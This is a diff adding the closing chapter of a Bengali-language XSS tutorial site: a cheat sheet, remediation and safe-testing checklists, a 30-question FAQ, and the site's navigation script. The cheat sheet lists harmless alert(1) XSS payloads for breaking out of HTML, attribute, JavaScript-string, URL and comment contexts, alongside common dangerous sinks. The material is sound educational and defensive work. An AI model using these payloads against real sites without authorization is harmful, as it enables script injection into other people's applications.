+    </ul></div>
+    <div class="card"><h4>সাধারণ Sink</h4><ul>
+      <li><code>innerHTML</code> / <code>outerHTML</code></li>
+      <li><code>document.write()</code> / <code>document.writeln()</code></li>
+      <li><code>eval()</code></li>
+      <li><code>setTimeout()</code>/<code>setInterval()</code> (স্ট্রিং আর্গুমেন্ট)</li>
+      <li><code>element.setAttribute('onclick', ...)</code></li>
+      <li><code>href</code>/<code>src</code> attribute (javascript: স্কিম)</li>
+    </ul></div>
+  </div>
+
+  <h2>Context Identification Cheat Sheet</h2>
+  <table>
+    <thead><tr><th>Context</th><th>চেনার চিহ্ন</th><th>প্রথম চেষ্টা payload</th></tr></thead>
+    <tbody>
+      <tr><td>HTML text</td><td>দুই ট্যাগের মাঝে, কোনো quote নেই</td><td><code>&lt;svg onload=alert(1)&gt;</code></td></tr>
+      <tr><td>Attribute (quoted)</td><td><code>attr="INPUT"</code></td><td><code>"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td></tr>
+      <tr><td>Attribute (unquoted)</td><td><code>attr=INPUT</code> (কোনো quote নেই)</td><td><code>x onmouseover=alert(1)</code></td></tr>
+      <tr><td>JS string</td><td><code>&lt;script&gt;var x="INPUT"&lt;/script&gt;</code></td><td><code>";alert(1);//</code></td></tr>
+      <tr><td>URL</td><td><code>href="INPUT"</code></td><td><code>javascript:alert(1)</code></td></tr>
+      <tr><td>HTML comment</td><td><code>&lt;!-- INPUT --&gt;</code></td><td><code>--&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--</code></td></tr>
+    </tbody>
+  </table>
+
+  <h2>Safe Testing Checklist</h2>
+  <ul>
+    <li>☑ শুধুমাত্র নিজের lab বা স্পষ্টভাবে অনুমোদিত/scope-ভুক্ত টার্গেটে টেস্ট করছি।</li>
+    <li>☑ সবসময় harmless proof-of-execution (<code>alert</code>) ব্যবহার করছি, কখনো ডেটা চুরি/পরিবর্তনের চেষ্টা না।</li>
+    <li>☑ Blind XSS টেস্টে শুধু নিজের নিয়ন্ত্রিত collector ব্যবহার করছি।</li>
+    <li>☑ Time-based/delay-ভিত্তিক টেকনিক সীমিত সংখ্যায় রাখছি, যাতে সার্ভারে অপ্রয়োজনীয় লোড না পড়ে।</li>
+    <li>☑ Unique marker string ব্যবহার করছি, যাতে false positive এড়ানো যায়।</li>
+  </ul>
+
+  <h2>Remediation Checklist</h2>
+  <ul>
+    <li>☑ Output encoding context-aware এবং output-time-এ প্রয়োগ করা হয়েছে।</li>
+    <li>☑ বিপজ্জনক sink (<code>innerHTML</code>, <code>eval</code>) ব্যবহারের প্রতিটি instance review করা হয়েছে।</li>
+    <li>☑ Rich HTML-এর জন্য DOMPurify (বা সমমানের) ব্যবহৃত হচ্ছে, কোনো কাস্টম regex sanitizer না।</li>
+    <li>☑ CSP প্রয়োগ করা আছে, <code>unsafe-inline</code> ছাড়া।</li>
+    <li>☑ Session cookie-তে <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code> সেট করা আছে।</li>
+    <li>☑ XSS fix regression test দিয়ে কভার করা আছে।</li>
+  </ul>
+
+  <h2>Common Mistakes — সংক্ষিপ্ত পুনরালোচনা</h2>
+  <ul>
+    <li>শুধু input validation করে output encoding বাদ দেওয়া।</li>
+    <li>Blocklist-ভিত্তিক filter-এর উপর নির্ভর করা।</li>
+    <li>"আমরা modern framework ব্যবহার করি, তাই নিরাপদ" ধরে নেওয়া।</li>
+    <li>Admin/internal panel-কে কম যত্নসহকারে sanitize করা।</li>
+    <li>একটি জায়গায় ফিক্স করে ধরে নেওয়া সব জায়গায় ফিক্স হয়ে গেছে (একই ডেটা একাধিক জায়গায় রেন্ডার হতে পারে)।</li>
+    <li>CSP-কে output encoding-এর বিকল্প ভাবা।</li>
+  </ul>
+
+  <h2>বিস্তারিত FAQ (৩০টি প্রশ্ন)</h2>
+
+  <details><summary>১. XSS কি এখনও প্রাসঙ্গিক, যেহেতু আধুনিক ফ্রেমওয়ার্ক auto-escape করে?</summary><div class="inner"><p>হ্যাঁ, সম্পূর্ণভাবে প্রাসঙ্গিক। Auto-escaping ডিফল্ট সুরক্ষা দেয়, কিন্তু escape hatch API, legacy কোড, third-party ইন্টিগ্রেশন এবং misconfiguration-এর মাধ্যমে XSS এখনও OWASP Top 10-এর নিয়মিত অংশ।</p></div></details>
+  <details><summary>২. XSS ও CSRF কি একসাথে ঘটতে পারে?</summary><div class="inner"><p>হ্যাঁ — XSS প্রায়ই CSRF protection (token) বাইপাস করার একটি শক্তিশালী উপায়, কারণ XSS থাকলে attacker ভিকটিমের ব্রাউজার থেকেই CSRF token পড়ে ফেলতে পারে।</p></div></details>
+  <details><summary>৩. HttpOnly cookie থাকলে কি XSS সম্পূর্ণ নিরাপদ হয়ে যায়?</summary><div class="inner"><p>না। HttpOnly শুধু <code>document.cookie</code> দিয়ে সরাসরি cookie পড়া প্রতিরোধ করে — কিন্তু attacker তখনও ভিকটিমের সেশন ব্যবহার করে সরাসরি authenticated action চালাতে পারে।</p></div></details>
+  <details><summary>৪. CSP থাকলে কি XSS টেস্ট করার প্রয়োজন নেই?</summary><div class="inner"><p>না — CSP bypass প্রায়ই সম্ভব হয়, এবং CSP ভুল কনফিগার করা থাকতে পারে। CSP একটি defense-in-depth স্তর, একমাত্র প্রতিরক্ষা নয়।</p></div></details>
+  <details><summary>৫. Self-XSS কি কখনো গুরুত্বপূর্ণ হতে পারে?</summary><div class="inner"><p>হ্যাঁ, যদি এটি অন্য কোনো vulnerability (যেমন CSRF বা clickjacking)-এর সাথে চেইন করে অন্য ভিকটিমকে প্রভাবিত করা যায়।</p></div></details>
+  <details><summary>৬. সব sanitizer কি সমান নিরাপদ?</summary><div class="inner"><p>না — নিজে লেখা regex-ভিত্তিক sanitizer অত্যন্ত ঝুঁকিপূর্ণ। শুধুমাত্র সক্রিয়ভাবে রক্ষণাবেক্ষিত, ব্যাপকভাবে পরীক্ষিত লাইব্রেরি (DOMPurify) ব্যবহার করা উচিত।</p></div></details>
+  <details><summary>৭. DOM-based XSS কেন server-side scanner মিস করে?</summary><div class="inner"><p>কারণ payload কখনো সার্ভারে পাঠানো হয় না (যেমন hash fragment) — শুধুমাত্র client-side JavaScript অডিট করে এটি ধরা সম্ভব।</p></div></details>
+  <details><summary>৮. একটি alert() পপআপ কি যথেষ্ট প্রমাণ?</summary><div class="inner"><p>শিক্ষামূলক/lab প্রসঙ্গে, হ্যাঁ — এটি নিশ্চিত করে code execution ঘটছে। বাস্তব রিপোর্টে এর সাথে context ও impact বিশ্লেষণও যোগ করা উচিত।</p></div></details>
+  <details><summary>৯. Markdown রেন্ডারিং কেন ঝুঁকিপূর্ণ?</summary><div class="inner"><p>অনেক markdown parser raw HTML pass-through করে এবং নিজে sanitize করে না — তাই আউটপুট সবসময় untrusted HTML হিসেবে বিবেচনা করে আলাদাভাবে sanitize করা উচিত।</p></div></details>
+  <details><summary>১০. SVG ফাইল কীভাবে XSS vector হতে পারে?</summary><div class="inner"><p>SVG একটি XML-ভিত্তিক ফরম্যাট যার ভেতরে <code>&lt;script&gt;</code> থাকতে পারে — ব্রাউজারে সরাসরি খোলা হলে তা execute হতে পারে।</p></div></details>
+  <details><summary>১১. Blind XSS collector হিসেবে third-party সার্ভিস ব্যবহার করা কি নিরাপদ?</summary><div class="inner"><p>সতর্কতা প্রয়োজন — সংগ্রহ করা ডেটা সেই তৃতীয় পক্ষের নিয়ন্ত্রণে যেতে পারে। নিজের নিয়ন্ত্রণে থাকা collector সবসময় বেশি নিরাপদ।</p></div></details>
+  <details><summary>১২. XSS দিয়ে কি সরাসরি সার্ভার হ্যাক করা সম্ভব?</summary><div class="inner"><p>সরাসরি না — XSS মূলত client-side vulnerability। তবে এটি admin-এর browser-এ এমন action trigger করতে পারে যা পরোক্ষভাবে সার্ভার-সাইড পরিবর্তন ঘটায় (যেমন admin-এর সেশন ব্যবহার করে কনফিগারেশন পরিবর্তন)।</p></div></details>
+  <details><summary>১৩. WAF (Web Application Firewall) থাকলে কি XSS সম্ভব নয়?</summary><div class="inner"><p>না, WAF bypass প্রায়ই সম্ভব — encoding ভিন্নতা, কম পরিচিত ট্যাগ/ইভেন্ট, বা case variation দিয়ে। WAF একটি অতিরিক্ত স্তর, root-cause fix-এর বিকল্প নয়।</p></div></details>
+  <details><summary>১৪. JSON response কি XSS থেকে নিরাপদ?</summary><div class="inner"><p>JSON নিজে সরাসরি execute হয় না, কিন্তু JSON-এর ভেতরের স্ট্রিং যদি পরে client-side-এ <code>innerHTML</code>-এ বসানো হয়, তাহলে একই ঝুঁকি প্রযোজ্য।</p></div></details>
+  <details><summary>১৫. XSS কি শুধুমাত্র ওয়েব ব্রাউজারেই ঘটে?</summary><div class="inner"><p>প্রধানত হ্যাঁ, তবে যেকোনো HTML/JS রেন্ডার করা পরিবেশ (যেমন Electron অ্যাপ, ইমেইল ক্লায়েন্টের HTML preview, কিছু PDF viewer) একই ধরনের ঝুঁকিতে পড়তে পারে।</p></div></details>
+  <details><summary>১৬. একটি ভাল bug bounty XSS রিপোর্টে সবচেয়ে বেশি গুরুত্ব কোথায় দিতে হয়?</summary><div class="inner"><p>Reproducibility (স্পষ্ট ধাপ) ও evidence-based impact — অনুমাননির্ভর দাবির চেয়ে প্রকৃত পর্যবেক্ষণ (HttpOnly আছে কি না, CSP আছে কি না) অনেক বেশি মূল্যবান।</p></div></details>
+  <details><summary>১৭. XSS কি GDPR/ডেটা প্রাইভেসি আইনের সাথে সম্পর্কিত?</summary><div class="inner"><p>হ্যাঁ — যদি XSS দিয়ে ব্যক্তিগত ডেটা ফাঁস সম্ভব হয়, এটি একটি data-protection ঝুঁকি হিসেবেও বিবেচিত হতে পারে, যা প্রাসঙ্গিক আইন অনুযায়ী রিপোর্টিং বাধ্যবাধকতা তৈরি করতে পারে।</p></div></details>
+  <details><summary>১৮. কেন একই payload বিভিন্ন ব্রাউজারে ভিন্নভাবে আচরণ করতে পারে?</summary><div class="inner"><p>বিভিন্ন ব্রাউজার ইঞ্জিন HTML parsing ও malformed markup normalize করার ক্ষেত্রে সামান্য ভিন্ন আচরণ করে — এটি বিশেষভাবে mutation XSS গবেষণায় গুরুত্বপূর্ণ।</p></div></details>
+  <details><summary>১৯. Input length limit কি XSS প্রতিরোধ করে?</summary><div class="inner"><p>না সরাসরি না — অনেক payload (যেমন <code>&lt;svg onload=alert(1)&gt;</code>) খুবই ছোট, তাই length limit কার্যকর প্রতিরক্ষা নয়।</p></div></details>
+  <details><summary>২০. একটি পেলোড URL-এ কাজ করছে কিন্তু POST body-তে করছে না কেন হতে পারে?</summary><div class="inner"><p>বিভিন্ন input channel প্রায়ই কোডের ভিন্ন অংশ দিয়ে প্রসেস হয় — একটি জায়গায় encoding থাকলেও অন্য জায়গায় নাও থাকতে পারে; প্রতিটি channel আলাদাভাবে টেস্ট করা প্রয়োজন।</p></div></details>
+  <details><summary>২১. Trusted Types কি সব ব্রাউজারে সমর্থিত?</summary><div class="inner"><p>না, এটি তুলনামূলকভাবে নতুন একটি API এবং browser support সীমিত হতে পারে — তাই এটিকে একমাত্র প্রতিরক্ষা হিসেবে নির্ভর করা উচিত না, বরং output encoding-এর সাথে সম্পূরক হিসেবে ব্যবহার করা উচিত।</p></div></details>
+  <details><summary>২২. একটি XSS payload যা শুধু Firefox-এ কাজ করে, Chrome-এ না — এটি কি গুরুত্বপূর্ণ?</summary><div class="inner"><p>হ্যাঁ, এখনও গুরুত্বপূর্ণ — যেকোনো ব্যাপকভাবে ব্যবহৃত ব্রাউজারে vulnerability থাকলে তা সেই ব্রাউজার ব্যবহারকারী ভিকটিমদের জন্য ঝুঁকিপূর্ণ; রিপোর্টে ব্রাউজার-নির্দিষ্টতা স্পষ্টভাবে উল্লেখ করা উচিত।</p></div></details>
+  <details><summary>২৩. DOM clobbering প্রতিরোধ করার সহজ উপায় কী?</summary><div class="inner"><p>Global namespace-এ নির্ভর করার বদলে module-scoped variable ব্যবহার করা, এবং কোনো global object-এর টাইপ অনুমান না করে স্পষ্টভাবে যাচাই (<code>typeof</code> চেক) করা।</p></div></details>
+  <details><summary>২৪. XSS vulnerability কি automated scanner দিয়ে সম্পূর্ণ শনাক্ত করা সম্ভব?</summary><div class="inner"><p>আংশিকভাবে — scanner সাধারণ reflected/stored প্যাটার্ন ভালোভাবে ধরে, কিন্তু DOM-based, blind, এবং বিশেষ করে logic-নির্ভর/mutation XSS-এর জন্য ম্যানুয়াল বিশ্লেষণ এখনও অপরিহার্য।</p></div></details>
+  <details><summary>২৫. কেন একটি ফিক্সড vulnerability পরবর্তীতে আবার ফিরে আসতে পারে (regression)?</summary><div class="inner"><p>কোড refactor, নতুন ফিচার যোগ, বা টিম পরিবর্তনের কারণে আগের fix ভুলে যাওয়া/হারিয়ে যাওয়া সাধারণ ঘটনা — এজন্যই automated regression test গুরুত্বপূর্ণ।</p></div></details>
+  <details><summary>২৬. একটি API যা শুধু mobile app ব্যবহার করে (ব্রাউজার না), তার কি XSS ঝুঁকি আছে?</summary><div class="inner"><p>সরাসরি কম, যদি response কখনো কোনো ব্রাউজার/WebView-এ render না হয়। কিন্তু যদি সেই একই API response কখনো একটি admin ওয়েব ড্যাশবোর্ডেও দেখানো হয়, ঝুঁকি ফিরে আসে।</p></div></details>
+  <details><summary>২৭. XSS ও clickjacking-এর সম্পর্ক কী?</summary><div class="inner"><p>এগুলো ভিন্ন vulnerability, কিন্তু একসাথে চেইন করা যেতে পারে — যেমন একটি XSS দিয়ে পেজের layout পরিবর্তন করে clickjacking-এর জন্য প্রস্তুত করা।</p></div></details>
+  <details><summary>২৮. "Reflected XSS সবসময় কম গুরুত্বপূর্ণ" — এটি কি সত্যি?</summary><div class="inner"><p>না — একটি reflected XSS যদি কোনো interaction ছাড়াই (autofocus) trigger হয় এবং widely shared/high-traffic পেজে থাকে, এটি উল্লেখযোগ্য impact রাখতে পারে।</p></div></details>
+  <details><summary>২৯. একাধিক XSS একসাথে পাওয়া গেলে কীভাবে রিপোর্ট করব?</summary><div class="inner"><p>Root cause আলাদা হলে (ভিন্ন ফিচার, ভিন্ন ফিক্স প্রয়োজন) সাধারণত আলাদা রিপোর্ট ভালো; একই root cause-এর একাধিক instance হলে একটি রিপোর্টে একত্রে উল্লেখ করা যুক্তিসঙ্গত — প্রোগ্রামের নীতি অনুযায়ী সিদ্ধান্ত নিন।</p></div></details>
+  <details><summary>৩০. এই ডকুমেন্টেশন শেষ করার পর পরবর্তী পদক্ষেপ কী হওয়া উচিত?</summary><div class="inner"><p>PortSwigger Web Security Academy-এর XSS lab গুলো হাতে-কলমে practice করুন, OWASP Juice Shop/DVWA-তে নিজের পরিবেশে চর্চা করুন, এবং ধীরে ধীরে, দায়িত্বশীলভাবে, একটি সহজ bug bounty প্রোগ্রাম দিয়ে বাস্তব experience শুরু করুন।</p></div></details>
+
+  <h2>Authoritative Further Learning Resources</h2>
+  <ul>
+    <li>OWASP Cross Site Scripting Prevention Cheat Sheet</li>
+    <li>PortSwigger Web Security Academy — Cross-site scripting</li>
+    <li>OWASP Top 10 — Injection ও Security Misconfiguration বিভাগ</li>
+    <li>DOMPurify অফিসিয়াল ডকুমেন্টেশন ও GitHub রিপোজিটরি</li>
+    <li>MDN Web Docs — Content-Security-Policy</li>
+    <li>OWASP Juice Shop ও DVWA (অনুশীলনের জন্য intentionally vulnerable অ্যাপ)</li>
+  </ul>
+
+  <div class="callout legal"><div class="ic">⚖️</div><p><strong>শেষ আইনি নোটিশ:</strong> এই সম্পূর্ণ ডকুমেন্টেশন জুড়ে উল্লেখিত সব জ্ঞান, টেকনিক ও পেলোড শুধুমাত্র শিক্ষামূলক উদ্দেশ্যে। অনুমতি ছাড়া কোনো সিস্টেমে প্রয়োগ করলে তা ফৌজদারি অপরাধ হিসেবে গণ্য হতে পারে। দায়িত্বের সাথে, শুধুমাত্র অনুমোদিত পরিবেশে এই জ্ঞান প্রয়োগ করুন।</p></div>
+
+  <div class="summary-box">
+    <h4>অধ্যায় ও ডকুমেন্টেশন সম্পন্ন</h4>
+    <p>অভিনন্দন — আপনি XSS ডকুমেন্টেশনের সবগুলো ১৫টি অধ্যায় সম্পন্ন করেছেন: fundamentals, browser parsing, XSS-এর প্রকারভেদ, payload encyclopedia, context identification, encoding/bypass, Burp Suite টেস্টিং, advanced research, আধুনিক ওয়েব অ্যাপ, impact assessment, prevention, bug bounty workflow, hands-on lab, এবং assessment। এখন সময় practice-এ নেমে পড়ার — দায়িত্বের সাথে।</p>
+  </div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter14"><span>পূর্ববর্তী</span>অধ্যায় ১৪</a>
+  </div>
+</section>
+
+      </div>
+    </div>
+    <footer class="site-footer">© learn.alamincyber.com — XSS Documentation · শুধুমাত্র শিক্ষামূলক ও অনুমোদিত ব্যবহারের জন্য</footer>
+  </div>
+</div>
+
+<script>
+/* ===================== CHAPTER REGISTRY ===================== */
+var CHAPTERS = [
+  {id:"chapter01", num:"০১", title:"XSS এর ভিত্তি"},
+  {id:"chapter02", num:"০২", title:"HTML, JS ও ব্রাউজার পার্সিং"},
+  {id:"chapter03", num:"০৩", title:"XSS এর প্রকারভেদ"},
+  {id:"chapter04", num:"০৪", title:"পেলোড এনসাইক্লোপিডিয়া"},
+  {id:"chapter05", num:"০৫", title:"কনটেক্সট শনাক্তকরণ"},
+  {id:"chapter06", num:"০৬", title:"এনকোডিং ও ফিল্টার বাইপাস"},
+  {id:"chapter07", num:"০৭", title:"Burp Suite দিয়ে টেস্টিং"},
+  {id:"chapter08", num:"০৮", title:"অ্যাডভান্সড XSS রিসার্চ"},
+  {id:"chapter09", num:"০৯", title:"আধুনিক ওয়েব অ্যাপে XSS"},
+  {id:"chapter10", num:"১০", title:"প্রভাব ও ঝুঁকি মূল্যায়ন"},
+  {id:"chapter11", num:"১১", title:"প্রতিরোধ ও সিকিউর কোডিং"},
+  {id:"chapter12", num:"১২", title:"বাগ বাউন্টি ওয়ার্কফ্লো"},
+  {id:"chapter13", num:"১৩", title:"হ্যান্ডস-অন ল্যাব"},
+  {id:"chapter14", num:"১৪", title:"অনুশীলনী ও মূল্যায়ন"},
+  {id:"chapter15", num:"১৫", title:"শব্দকোষ ও চিট শিট / FAQ"}
+];
+var DOC_INDEX = "https://learn.alamincyber.com/documentation/";
+
+/* ===================== BUILD SIDEBAR ===================== */
+(function buildToc(){
+  var toc = document.getElementById("toc");
+  var liHome = document.createElement("li");
+  liHome.innerHTML = '<a href="/"><span class="num">●</span>XSS Documentation Home</a>';
+  toc.appendChild(liHome);
+  CHAPTERS.forEach(function(ch){
+    var li = document.createElement("li");
+    li.innerHTML = '<a href="/'+ch.id+'" data-id="'+ch.id+'"><span class="num">'+ch.num+'</span>'+ch.title+'</a>';
+    toc.appendChild(li);
+  });
+})();
+
+/* ===================== ROUTING (clean root-relative paths, e.g. /chapter02) ===================== */
+function idToPath(route){ return route === "" ? "/" : "/" + route; }
+function currentRouteFromPath(path){
+  var p = path.replace(/\/+$/,"") || "/";
+  var m = p.match(/chapter(\d{2})/);
+  if (m) return "chapter" + m[1];
+  // Anything that isn't a recognizable /chapterNN path is treated as the landing
+  // page — this covers "/", "/index.html", a nested deployment folder like
+  // "/documentation/xss/", AND opening the file directly (file://...index.html,
+  // where location.pathname is the full filesystem path). A genuinely bad chapter
+  // number (e.g. /chapter99) still matches the regex above and correctly falls
+  // through to the not-found page via routeExists().
+  return "";
+}
+
+function routeExists(route){
+  if (route === "") return true;
+  return CHAPTERS.some(function(c){ return c.id === route; });
+}
+
+function showRoute(route, opts){
+  opts = opts || {};
+  var valid = routeExists(route) ? route : "__notfound__";
+  var sections = document.querySelectorAll(".chapter");
+  sections.forEach(function(s){ s.classList.remove("active"); });
+
+  var target;
+  if (valid === "") target = document.getElementById("landing");
+  else if (valid === "__notfound__") target = document.getElementById("notfound");
+  else target = document.getElementById(valid);
+
+  if (target) target.classList.add("active");
+
+  // sidebar active state
+  document.querySelectorAll(".toc a").forEach(function(a){
+    a.classList.toggle("active", a.getAttribute("data-id") === valid);
+  });
+
+  // topbar title + breadcrumb
+  var topTitle = document.getElementById("topTitle");
+  var breadcrumb = document.getElementById("breadcrumb");
+  if (valid === ""){
+    topTitle.textContent = "XSS Documentation";
+    breadcrumb.innerHTML = "";
+  } else if (valid === "__notfound__"){
+    topTitle.textContent = "পাওয়া যায়নি";
+    breadcrumb.innerHTML = '<a href="/">XSS Documentation</a> / ৪০৪';
+  } else {
+    var ch = CHAPTERS.filter(function(c){return c.id===valid;})[0];
+    topTitle.textContent = "অধ্যায় "+ch.num+" — "+ch.title;
+    breadcrumb.innerHTML = '<a href="/">XSS Documentation</a> / অধ্যায় '+ch.num;
+  }
+
+  document.title = (valid===""? "XSS Documentation" : (valid==="__notfound__" ? "404" : "অধ্যায় "+CHAPTERS.filter(function(c){return c.id===valid;})[0].num)) + " — Learn Cyber Security";
+
+  if (!opts.noScroll){
+    document.getElementById("content").scrollIntoView({block:"start"});
+    window.scrollTo(0,0);
+  }
+  closeSidebarMobile();
+}
+
+function navigateTo(route, push){
+  var path = idToPath(route);
+  if (push !== false && location.pathname !== path){
+    try {
+      history.pushState({route:route}, "", path);
+    } catch (e) {
+      // Some sandboxed/embedded preview contexts (e.g. an iframe loaded via
+      // srcdoc, whose real document URL is "about:srcdoc") throw a
+      // SecurityError here because the URL doesn't match the document's
+      // actual origin/path. On a real host (GitHub Pages etc.) this never
+      // happens. Fail silently so the app still renders the right chapter —
+      // only the address-bar URL won't update in that sandboxed case.
+    }
+  }
+  showRoute(route);
+}
+
+/* intercept internal nav clicks — any same-origin, root-relative link (href="/...") */
+document.addEventListener("click", function(e){
+  var a = e.target.closest('a[href^="/"]');
+  if (!a) return;
+  if (a.target === "_blank" || a.hasAttribute("download")) return;
+  var url = new URL(a.href, location.origin);
+  if (url.origin !== location.origin) return;
+  e.preventDefault();
+  navigateTo(currentRouteFromPath(url.pathname), true);
+});
+
+window.addEventListener("popstate", function(e){
+  var route = (e.state && typeof e.state.route === "string") ? e.state.route : currentRouteFromPath(location.pathname);
+  showRoute(route, {noScroll:true});
+});
+
+/* ===================== SIDEBAR TOGGLES ===================== */
+var sidebar = document.getElementById("sidebar");
+var scrim = document.getElementById("scrim");
+var mainWrap = document.getElementById("mainWrap");
+
+function openSidebarMobile(){
+  sidebar.classList.add("open");
+  scrim.classList.add("show");
+  document.getElementById("hamburgerBtn").setAttribute("aria-expanded","true");
+}
+function closeSidebarMobile(){
+  sidebar.classList.remove("open");
+  scrim.classList.remove("show");
+  document.getElementById("hamburgerBtn").setAttribute("aria-expanded","false");
+}
+document.getElementById("hamburgerBtn").addEventListener("click", function(){
+  if (sidebar.classList.contains("open")) closeSidebarMobile(); else openSidebarMobile();
+});
+scrim.addEventListener("click", closeSidebarMobile);
+
+document.getElementById("collapseBtn").addEventListener("click", function(){
+  sidebar.classList.toggle("collapsed");
+  mainWrap.classList.toggle("full");
+});
+
+document.addEventListener("keydown", function(e){
+  if (e.key === "Escape") closeSidebarMobile();
+});
+
+/* ===================== COPY CODE BUTTONS ===================== */
+document.addEventListener("click", function(e){
+  var btn = e.target.closest(".copy-btn");
+  if (!btn) return;
+  var block = btn.closest(".codeblock");
+  var codeEl = block.querySelector("pre code") || block.querySelector("pre");
+  var text = codeEl.textContent;
+  navigator.clipboard.writeText(text).then(function(){
+    var old = btn.textContent;
+    btn.textContent = "কপি হয়েছে ✓";
+    btn.classList.add("copied");
+    setTimeout(function(){ btn.textContent = old; btn.classList.remove("copied"); }, 1500);
+  }).catch(function(){
+    btn.textContent = "কপি ব্যর্থ";
+  });
+});
+
+/* initial load — runs last, after sidebar/scrim/listeners above are all set up,
+   since showRoute() -> closeSidebarMobile() depends on them existing */
+(function initRoute(){
+  var route = currentRouteFromPath(location.pathname);
+  // replace current history entry with a state object so popstate works immediately after.
+  // Wrapped in try/catch: a sandboxed preview iframe (document URL "about:srcdoc") throws
+  // a SecurityError here since the target URL can't match its real origin/path — harmless
+  // to skip in that case; on a real host (GitHub Pages etc.) this always succeeds.
+  try {
+    history.replaceState({route:route}, "", idToPath(route));
+  } catch (e) {}
+  showRoute(route, {noScroll:true});
+})();
+</script>
+</body>
+</html>
